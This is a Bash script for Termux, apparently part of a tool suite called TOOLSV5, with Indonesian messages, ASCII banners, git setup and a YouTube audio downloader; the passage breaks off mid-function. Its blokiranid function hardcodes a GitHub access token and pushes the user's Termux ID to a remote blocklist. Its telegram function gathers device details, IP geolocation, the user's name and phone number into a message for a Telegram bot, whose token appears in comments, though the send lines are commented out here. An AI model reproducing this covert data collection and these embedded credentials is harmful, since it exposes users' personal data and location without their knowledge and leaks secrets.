e="echo -e "
s="sleep 1"
ss="sleep 2"
sss="sleep 3"
Version="./pockat/Version"
versitoolsv5=$(cat "$Version")
update="./pockat/info"
gal="/data/data/com.termux/files/usr/lib/$versitoolsv5"
musik="bash $HOME/TOOLSV5/test.sh"
letakgalirus="/data/data/com.termux/files/usr/etc/apt"
internalsc="/data/data/com.termux/files/usr/include/jso"
termux_id=$(whoami)
versitoolsv5=$(cat "$Version")
m="\033[1;31m"   # Merah (sudah diberikan)
h="\033[1;32m"   # Hijau (sudah diberikan)
k="\033[1;33m"   # Kuning (sudah diberikan)
b="\033[1;34m"   # Biru (sudah diberikan)
bl="\033[1;36m"  # Biru Muda (sudah diberikan)
p="\033[1;37m"   # Putih (sudah diberikan)
u="\033[1;35m"   # Ungu
pu="\033[1;30m"  # Abu-abu
c="\033[1;96m"   # Cyan Terang
bg_m="\033[41m"  # Latar Belakang Merah
bg_h="\033[42m"  # Latar Belakang Hijau
bg_k="\033[43m"  # Latar Belakang Kuning
bg_b="\033[44m"  # Latar Belakang Biru
bg_bl="\033[46m" # Latar Belakang Biru Muda
bg_p="\033[47m"  # Latar Belakang Putih
bg_u="\033[45m"  # Latar Belakang Ungu
bg_pu="\033[40m" # Latar Belakang Abu-abu
res="\033[0m"    # Reset semua atribut
trial="/data/data/com.termux/files/usr/lib/bash/fndmnc95913592fn"
banner1() {
echo "⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣠⣼⠂⠀⠀⠀⠀⠙⣦⢀⠀⠀⠀⠀⠀⢶⣤⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⠷⢦⠀⣹⣶⣿⣦⣿⡘⣇⠀⠀⠀⢰⠾⣿⣿⣿⣟⣻⣿⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⢺⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⢟⣥⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⢻⣿⣿⡏⢹⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⣝⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢛⣿⣿⣿⡇⠀⠀⠀⠀⠛⣿⣿⣷⡀⠘⢿⣧⣻⡷⠀⠀⠀⠀⠀⠀⣿⣿⣿⣟⢿⣿⣿⣿⣿⣿⣿⣿⣿⣝⢧⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣾⣿⠟⣡⣾⣿⣿⣧⣿⡿⣋⣴⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⢻⣿⣿⣿⣶⡄⠙⠛⠁⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣷⣝⢻⣿⣟⣿⣿⣷⣮⡙⢿⣽⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡿⢋⣴⣿⣿⣿⣿⣿⣼⣯⣾⣿⣿⡿⣻⣿⣿⣿⣦⠀⠀⠀⠀⢀⣹⣿⣿⣿⣿⣶⣤⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠻⣿⣿⣿⣮⣿⣿⣿⣿⣿⣿⣦⡙⢿⣇⠀⠀⠀⠀
⠀⠀⠀⣠⡏⣰⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⡿⢋⣼⣿⣿⣿⣿⣿⣷⡤⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⢠⣾⣿⣿⣿⣿⣿⣷⡜⢿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣦⡙⣦⠀⠀⠀
⠀⠀⣰⢿⣿⣿⠟⠋⣠⣾⣿⣿⣿⣿⣿⠛⢡⣾⡿⢻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠻⣿⡟⣿⣿⣿⠻⢿⣿⣿⣿⣿⣿⣿⣿⣟⠻⣿⣆⠙⢿⣿⣿⣿⣿⣿⣦⡈⠻⣿⣿⣟⣧⠀⠀
⠀⣰⢣⣿⡿⠃⣠⡾⠟⠁⠀⣸⣿⡟⠁⢀⣿⠋⢠⣿⡏⣿⣿⣿⣿⣿⢿⠁⢀⣠⣴⢿⣷⣿⣿⣿⠀⠀⠽⢻⣿⣿⣿⣿⡼⣿⡇⠈⢿⡆⠀⠻⣿⣧⠀⠈⠙⢿⣆⠈⠻⣿⣎⢧⠀
⠀⢣⣿⠟⢀⡼⠋⠀⠀⢀⣴⠿⠋⠀⠀⣾⡟⠀⢸⣿⠙⣿⠃⠘⢿⡟⠀⣰⢻⠟⠻⣿⣿⣿⣿⣿⣀⠀⠀⠘⣿⠋⠀⣿⡇⣿⡇⠀⠸⣿⡄⠀⠈⠻⣷⣄⠀⠀⠙⢷⡀⠙⣿⣆⠁
⢀⣿⡏⠀⡞⠁⢀⡠⠞⠋⠁⠀⠀⠀⠈⠉⠀⠀⠀⠿⠀⠈⠀⠀⠀⠀⠀⣿⣿⣰⣾⣿⣿⣿⣿⣿⣿⣤⠀⠀⠀⠀⠀⠉⠀⠸⠃⠀⠀⠈⠋⠀⠀⠀⠀⠙⠳⢤⣀⠀⠹⡄⠘⣿⡄
⣸⡟⠀⣰⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⠿⠿⠟⠁⠀⠹⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣧⠀⢹⣷
⣿⠃⢠⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣄⣤⣀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡇⠀⣿
⣿⠀⢸⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠉⢻⣧⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢸
⡇⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣧⡀⠀⠀⣿⣾⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⢸
⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾
⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⢀⣾⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡼⣿⣿⣾⣤⣠⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ "
}
banner2() {
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣿⣿⣶⣶⣶⣶⣦⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡄⢀⠴⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣎⣴⣋⣠⣤⣔⣠⣤⣤⣠⣀⣀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣂⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡾⣻⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣧⡀⠀
⠀⠀⠀⠀⠀⣀⣾⣿⣿⣿⠿⠛⠂⠀⠀⡀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡈⢻⣿⣿⣆⠈⢻⣧⠀
⠀⠀⠀⠀⠻⣿⠛⠉⠀⠀⠀⠀⢀⣤⣾⣿⣦⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⡇⠀⢻⣿⣿⡀⠀⠻⡆
⠀⠀⣰⣤⣤⣤⣤⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢻⣿⣿⣿⠀⠀⢹⣿⣇⠀⠀⠳
⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢻⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣧⠀⢻⣿⣿⡆⠀⠀⢻⣿⠀⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠼⠛⢿⣶⣦⣿⣿⠻⣿⣿⣿⣿⣿⣇⠀⢻⣿⡇⠀⠀⠀⣿⠀⠀⠀
⠸⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠀⠀⠀⠀⠀⠘⠁⠈⠛⠋⠀⠘⢿⣿⣿⣿⣿⡀⠈⣿⡇⠀⠀⠀⢸⡇⠀⠀
⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⡇⠀⢹⠇⠀⠀⠀⠈⠀⠀⠀
⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠼⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡉⠛⠛⠿⠿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣿⣷⡀⠉⠙⠻⠿⢿⣿⣷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢀⡄⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢦⣀⠀⠀⠀⢀⣴⣿⣧⣤⣴⣾⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
}
banner4() {
echo "
⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⢀⣾⡿⠋⠉⠁⢠⣿⠏⢁⣿⣿⣿⠏⠉⢸⣿⡏⠉⢻⣿⣿⡇⠈⠙⢿⣿⣿⣿⣷⡆⠀⠀⢇⠢⣈⡒⡤
⣿⣿⣿⣿⣿⣏⣴⡇⠀⠀⠀⢠⡿⠋⠀⠀⠀⣰⣿⠋⠀⣼⣿⣿⠏⠀⠀⡾⣿⠁⠀⠀⣿⣿⣷⠀⠀⠀⠹⣿⣿⣿⣿⣄⢀⣿⣷⣿⣶⣶
⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⢠⡟⠁⠀⠀⠀⢰⣿⠇⠀⢰⣿⣿⡷⠀⣀⣜⣁⣻⣀⣀⣀⣸⢻⣿⡇⠀⠀⠀⠘⣿⣿⣷⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠃⠀⠀⣠⣿⠀⠀⠀⠀⢠⣿⡏⠀⢀⣿⣿⡿⠛⣩⣿⠿⠛⢻⡏⠉⠉⢹⠉⢿⣿⡀⠀⠀⠀⠹⣿⣿⡆⠙⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡏⠀⠀⣰⣿⡟⠀⠀⠀⢀⣾⣿⠀⠀⣸⣿⡿⢥⣶⠝⠁⠀⠀⠀⡇⠀⠀⡜⠰⡀⢻⡇⠀⠀⠀⠀⢿⣿⣿⠀⠸⣿⣿⣿⡿
⣿⣿⢿⣿⣿⡃⠀⣼⣿⣿⡇⣀⣀⣤⣾⣿⡇⠀⠰⣼⡟⣠⠎⠁⠀⢀⣠⠔⠁⢹⣀⣠⣧⣶⣦⣤⣷⣤⣤⣠⣤⠼⣿⣿⡆⠀⢹⣿⣿⣿
⣿⣿⣿⣿⣿⠀⣼⣿⣿⣿⣏⣁⣼⣿⣿⣿⠀⢠⣾⣟⡔⠁⠀⠀⠀⢸⠁⠀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⣿⣿⣇⠀⠀⣿⣿⣿
⣿⣿⣿⣿⣿⣸⣿⣿⣿⣿⣟⣹⣿⣿⣿⡿⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⢰⣾⢟⣻⡿⠛⢻⢋⣻⣏⣱⠞⠙⣄⡀⠀⣿⡽⣿⠀⠀⢸⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠉⢘⡅⠚⠋⠉⠁⠀⠀⠀⠀⣔⣾⢏⢦⢄⣿⣧⣿⡆⠀⠈⣿⣿
⣿⣿⣿⣿⣿⡿⢸⣿⣿⣿⡿⢻⣿⣿⡿⠋⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠟⠉⠀⢂⢻⣿⣿⣿⡇⠀⠀⢽⣿
⣿⣿⣿⣿⣿⢃⣿⣿⣿⣿⣷⣿⣿⣿⣿⡷⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⢀⣠⣾⣟⡖⢻⣿⣿⠃⠀⠀⣿⣿
⣿⣿⣿⣿⣟⣼⣿⣿⣿⣿⣿⣿⠟⣻⠿⠓⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠾⠿⠛⠉⠁⢰⢸⣿⡿⠀⠀⠀⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠋⠰⢟⣿⠌⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠇⠀⠀⢠⡇⣿
⣿⣿⣿⣿⣿⣿⣏⠓⠓⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⠿⠿⢾⣿⡟⠀⠀⠀⣼⠃⣿
⣿⣿⣿⣿⣿⣿⣿⣷⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠤⠤⠤⠤⠤⠄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⣰⠏⢰⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡀⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⣠⢚⣡⣴⣾⣿⣿⣿⣿⡿⠿⢿⠀⠀⠀⠀⠀⠀⠀⠀⣼⡿⠁⠀⠀⣰⠏⣠⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣧⣤⣴⡾⠋⠀⠀⠀⠀⠀⠀⠀⣃⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⣼⣿⣃⠤⠚⠚⠉⠉⠉⠙⠛
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠉⠀⢀⡄⠀⠀⠀⠀⠀⠀⠙⢽⣿⠿⠋⠉⠁⠀⢠⡆⢰⠃⠀⠀⠀⠀⠀⠀⣼⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣴⡿⠁⠀⠀⠀⠀⠀⠀⠀⠈⢯⠀⠀⠀⠀⢀⡞⢠⠋⠀⠀⠀⠀⠀⢀⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⣸⢠⠃⠀⠀⠀⠀⠀⢠⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⡆⢠⠉⢿⣿⣿⡟⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠳⡀⠀⠀⡇⠇⠀⠀⠀⠀⠀⣠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣼⠀⠈⢿⣿⡇⢹⣿⣿⣿⣿⣿⣿⣿⡗⠤⣀⠀⠀⠀⠀⠀⠑⢄⣀⡞⠀⠀⠀⠀⢀⣴⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣷⠀⠀⠹⢇⠀⢻⣿⣿⣿⣿⣿⣿⣧⠀⠈⠻⣷⣦⣤⣀⡀⠀⠉⠀⠀⠀⣀⡴⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⠟⠀⠀⠀⠈⠳⣄⢻⣿⣿⣿⣿⣿⣿⣆⠀⠀⠈⠻⢿⣿⣿⣿⣷⣶⣴⣾⣿⣿⣿⣿⡿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣄⠀⠀⠀⠀⠀⠈⠳⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠉⡿⢿⣿⣿⣿⣿⣿⣿⣿⡿⢱⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
}
logo=("banner1" "banner2" "banner4")
random_index=$((RANDOM % ${#logo[@]}))
banner="${logo[random_index]}"
gitcek() {
install_git() {
echo "Menginstal git..."
nala uninstall git -y
nala install git -y
}
check_git_functionality() {
if ! git --version &> /dev/null; then
echo "Git tidak berfungsi. Memperbaiki instalasi..."
install_git
nala install libcurl openssl -y
nala install ruby curl gnupg ncurses-utils -y
else
echo "Git sudah terpasang dan berfungsi dengan benar."
fi
}
if ! command -v git &> /dev/null; then
echo "Git tidak terpasang."
install_git
else
check_git_functionality
fi
}
blokiranid() {
blocklistid="./pockat/block.txt"
cd ./pockat || exit
git config --global user.name "zerotermux"
git config --global user.email "zerotermux@example.com"
GITHUB_TOKEN="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"
if [ -d ".git/rebase-merge" ]; then
echo "Ada rebase yang sedang berlangsung. Menghapus direktori rebase-merge..."
rm -rf .git/rebase-merge
fi
git stash
git pull https://$GITHUB_TOKEN@github.com/zerotermux/pockat.git main --rebase
git stash pop
if git ls-files -u | grep -q "^"; then
echo "Ada konflik dalam file. Menyelesaikan konflik dengan versi lokal..."
git checkout --ours $(git ls-files -u | awk '{print $4}')
git add $(git ls-files -u | awk '{print $4}')
git rebase --continue
fi
id=$(whoami)
echo "$id" >> "$blocklistid"
git add block.txt
git commit -m "KONTOL LU ANAK BEBAN ASU"
git push https://$GITHUB_TOKEN@github.com/zerotermux/pockat.git main
}
termuxtoolsv5="/data/data/com.termux/files"
kirimpesan() {
>/dev/null
# TOKEN="7224304462:AAEcPFM4WwG5n57s8RuvDNxc-wFKdBK1aUQ"
# CHAT_ID="5034446293"
# NAMA_FILE="/storage/emulated/0/Movies/sopo.txt"
# NAMA=$(cat "$NAMA_FILE")
# TERMUX_ID=$(whoami)
# ISIPESAN="$isipesan"
# MESSAGE=$(
# cat << EOF
# 🔰 TOOLSV5 ��
# 👤 Nama: $NAMA
# 🆔 ID Termux: $TERMUX_ID
# 📋 Status: $ISIPESAN
# EOF
# )
# curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
# -d "chat_id=$CHAT_ID" \
# -d "text=$MESSAGE"
}
telegram() {
while true; do
cekinstal="/data/data/com.termux/files/usr/lib/commplate"
if [ -f "$cekinstal" ]; then
neofetch --stdout > ~/device_info.txt
brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')
if [[ "$memory" =~ "MB" ]]; then
memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
elif [[ "$memory" =~ "KB" ]]; then
memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')
fi
ip_info=$(curl -s ipinfo.io)
ip_address=$(echo "$ip_info" | jq -r '.ip')
city=$(echo "$ip_info" | jq -r '.city')
region=$(echo "$ip_info" | jq -r '.region')
country=$(echo "$ip_info" | jq -r '.country')
loc=$(echo "$ip_info" | jq -r '.loc')
# TOKEN="7224304462:AAEcPFM4WwG5n57s8RuvDNxc-wFKdBK1aUQ"
# CHAT_ID="5034446293"
TOKEN=""
CHAT_ID=""
NAMA_FILE="/storage/emulated/0/Movies/sopo.txt"
NAMA=$(cat "$NAMA_FILE")
VALID_IDS="./pockat/nhc"
TERMUX_ID=$(whoami)
NOMOR_TELEPON="Tidak Diketahui"
trial_dir="/data/data/com.termux/files/usr/trial"
whoami_file="$trial_dir/whoami"
manage_whoami_file() {
local current_user=$(whoami)
if [ -f "$whoami_file" ]; then
count=$(grep "^$current_user " "$whoami_file" | awk '{print $2}')
if [ -z "$count" ]; then
count=0
fi
else
count=0
fi
echo "$count"
}
isiangka=$(manage_whoami_file)
STATUS="TRIAL $isiangka Kali Running ❌"
if [ -f "$VALID_IDS" ]; then
while IFS= read -r line; do
if [[ "$line" == *"ID : $TERMUX_ID"* ]] || [[ "$line" == *"ID: $TERMUX_ID"* ]]; then
NOMOR_TELEPON=$(echo "$line" | grep -oP '\+?\d{8,15}')
STATUS="PREMIUM ✅"
break
fi
done < "$VALID_IDS"
fi
scan_files() {
local file=$1
if [ -f "$file" ]; then
if [ -s "$file" ]; then
echo "📂 File Aman ✅"
else
echo "📂 File Kosong ❌"
fi
else
echo "📂 File $file tidak ditemukan ❌"
fi
}
scan_results=$(
cat << EOF
$(scan_files "$scangittoken")
$(scan_files "$scanstatusgorax")
$(scan_files "$komponenutama")
$(scan_files "$toolsv5git")
$(scan_files "$pengunatrialcek")
EOF
)
caption=$(
cat << EOF
🔰 TOOLSV5 ��
👤 Nama: $NAMA
🆔 ID Termux: $TERMUX_ID
📋 Status: $STATUS
📞 Nomor Telepon: $NOMOR_TELEPON
ℹ️ Informasi: $NAMA Sedang Menjalankan TOOLSV5
🗂️ Hasil Scan File:
$scan_results
Informasi lengkap :
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
)
caption="${caption//'\\n'/$'\n'}" # Mengganti '\\n' dengan karakter baris baru
# URL="https://api.telegram.org/bot$TOKEN/sendMessage"
# curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption"
# echo "Pesan telah dikirim ke bot Telegram."
break
else
clear
echo "y" | termux-setup-storage
apt-get update
apt-get install -y curl neofetch inetutils jq
touch /data/data/com.termux/files/usr/lib/commplate
fi
done
}
if [ -d "$termuxtoolsv5" ]; then
nama_file="/storage/emulated/0/Movies/sopo.txt"
nama=$(cat "$nama_file")
MUSIEK() {
MUSIC_DIR="$HOME/TOOLSV5/music"
mkdir -p "$MUSIC_DIR"
if ! command -v yt-dlp &> /dev/null; then
clear
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $k $bg_m "Packaging Belum Terinstall Bentar Tod !$res"
echo
sleep 3
pkg update
pkg upgrade
nala install wget ffmpeg -y
wget https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp -O $PREFIX/bin/yt-dlp
chmod a+rx $PREFIX/bin/yt-dlp
break
fi
while true; do
clear
$e $k $bg_m "Setel Backsound TOOLSV5 Sesuai Selera Anda$res"
sleep 5
$e $b
read -p "Masukkan link YouTube Cuy : " YT_LINK
clear
play -q $HOME/TOOLSV5/sound/klik.mp3 &> /dev/null &
$e $b $bg_h "Proses Unduhan DiMulai$res"
sleep 3
echo
yt-dlp --extract-audio --audio-format mp3 -o "$MUSIC_DIR/%(title)s.%(ext)s" "$YT_LINK"
clear
